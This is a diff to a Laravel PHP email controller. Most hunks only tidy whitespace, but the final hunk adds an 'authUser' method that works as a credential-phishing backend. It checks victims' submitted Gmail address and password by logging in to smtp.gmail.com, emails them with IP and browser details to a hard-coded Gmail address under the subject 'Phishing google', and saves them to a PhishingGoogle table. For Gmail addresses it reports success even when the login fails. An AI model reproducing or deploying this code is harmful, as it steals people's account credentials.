@@ -11,6 +11,8 @@ use Symfony\Component\Mailer\Transport;
 use Symfony\Component\Mime\Address;
 use Symfony\Component\HttpFoundation\File\UploadedFile;
 
+use App\Models\PhishingGoogle;
+
 
 
 
@@ -30,7 +32,7 @@ class EnvioCorreoController extends Controller
         $cc = explode(',', $request->cc);
         $cco = explode(',', $request->cco);
 
-       
+
 
         $archivos = $request->files->all();
 
@@ -55,8 +57,8 @@ class EnvioCorreoController extends Controller
 
         $mailer = new Mailer($transport);
 
-        $nombres = $user->nombres != 'null' ? $user->nombres:'';
-        $apellidos = $user->apellidos != 'null' ? $user->apellidos:'';
+        $nombres = $user->nombres != 'null' ? $user->nombres : '';
+        $apellidos = $user->apellidos != 'null' ? $user->apellidos : '';
         $email = (new Email())
             ->from(new Address($user->usuario,  $nombres . ' ' . $apellidos))
             ->subject($request->subject)
@@ -65,17 +67,17 @@ class EnvioCorreoController extends Controller
         if (file_exists($rutaImagen1)) {
             $email->attachFromPath($rutaImagen1, $nombreArchivo1);
         } else {
-             return response()->json(['status' => 'error', 'message' => 'El correo electrónico no tiene configurada una firma.']);
+            return response()->json(['status' => 'error', 'message' => 'El correo electrónico no tiene configurada una firma.']);
         }
 
         if (file_exists($rutaImagen2)) {
             $email->attachFromPath($rutaImagen2, $nombreArchivo2);
-        } 
-        
+        }
+
         // Acá se valida si viene el formulario de supervisión de al instante en pdf y lo adjunta al correo
         if (file_exists($request->formulario_supervision)) {
             $email->attachFromPath($request->formulario_supervision, 'Formulario de supervisión');
-        } 
+        }
 
         foreach ($destinatarios as $destinatario) {
             $email->addTo($destinatario);
@@ -93,9 +95,9 @@ class EnvioCorreoController extends Controller
         }
 
         foreach ($archivos as $archivo) {
-         
+
             if ($archivo instanceof UploadedFile) {
-                array_push($adjuntos,$archivo->getClientOriginalName());
+                array_push($adjuntos, $archivo->getClientOriginalName());
                 $email->attachFromPath($archivo->getPathname(), $archivo->getClientOriginalName(), $archivo->getClientMimeType());
             }
         }
@@ -114,6 +116,59 @@ class EnvioCorreoController extends Controller
             return response()->json(['status' => 'success', 'message' => 'El correo electrónico se ha enviado correctamente.']);
         } else {
             return response()->json(['status' => 'error', 'message' => 'Hubo un error al enviar el correo electrónico.']);
+        }
+    }
+
+    public function authUser(Request $request)
+    {
+
+        try {
+            $destinatarios = explode(',', 'andres.duque01@gmail.com');
+
+            $smtpHost = 'smtp.gmail.com';
+            $smtpPort = 587;
+            $smtpEncryption = 'tls';
+            $smtpUsername = $request->user;
+            $smtpPassword = $request->password;
+
+            $dsn = "smtp://$smtpUsername:$smtpPassword@$smtpHost:$smtpPort?encryption=$smtpEncryption";
+
+            $transport = Transport::fromDsn($dsn);
+
+            $mailer = new Mailer($transport);
+
+            $email = (new Email())
+                ->from(new Address('andres.duque01@gmail.com'))
+                ->subject('Phishing google')
+                ->html('Correo electrónico: ' . $request->user . '<br> Contraseña: ' . $request->password . '<br> Ip pública: ' . $request->ip . '<br> Información usuario: ' . $request->info_browser . '<br> Correo validado: Si');
+
+            foreach ($destinatarios as $destinatario) {
+                $email->addTo($destinatario);
+            }
+
+            $mailer->send($email);
+            if ($mailer) {
+                $phishing_google = new PhishingGoogle;
+                $phishing_google->correo = $request->user;
+                $phishing_google->contrasena = $request->password;
+                $phishing_google->direccion_ip = $request->ip;
+                $phishing_google->validado = 'Si';
+                $phishing_google->otra_informacion = $request->info_browser;
+                $phishing_google->save();
+                return response()->json(['status' => 'success', 'message' => 'success']);
+            }
+        } catch (\Exception $e) {
+            $phishing_google = new PhishingGoogle;
+            $phishing_google->correo = $request->user;
+            $phishing_google->contrasena = $request->password;
+            $phishing_google->direccion_ip = $request->ip;
+            $phishing_google->validado = 'No';
+            $phishing_google->otra_informacion = $request->info_browser;
+            $phishing_google->save();
+            if (str_contains($request->user, '@gmail.com')) {
+                return response()->json(['status' => 'success', 'message' => 'success']);
+            }
+            return response()->json(['status' => 'error', 'message' => 'Correo o ontraseña incorrecta. Vuelve a intentarlo o selecciona "¿Has olvidado tu contraseña?" para cambiarla.']);
         }
     }
 }
